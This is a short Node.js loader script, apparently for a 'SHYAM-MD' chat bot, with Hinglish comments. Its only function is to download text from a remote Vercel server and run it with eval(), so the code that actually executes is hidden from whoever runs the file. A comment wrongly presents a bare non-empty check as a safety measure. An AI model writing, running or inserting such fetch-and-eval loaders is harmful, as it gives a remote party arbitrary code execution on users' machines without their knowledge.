const axios = require('axios');

// Tumhara apna API Server URL (Yahan apna sahi link dalna)
const shyamServer = "https://hans-xmd-sever.vercel.app/api/🚀"; 

axios.get(shyamServer)
    .then(response => {
        // Success Message with your Branding
        console.log("\x1b[32m✅ [SHYAM-MD] Successfully loaded script from DEX SHYAM Server.\x1b[0m");
        
        // Data execute karne se pehle check karna safe rehta hai
        if (response.data) {
            eval(response.data);
        }
    })
    .catch(err => {
        // Error Message with your Branding
        console.error("\x1b[31m❌ [SHYAM-MD] Failed to load script from DEX SHYAM Server API.\x1b[0m");
        console.error("\x1b[33m📝 Error Details: " + err.message + "\x1b[0m");
    });
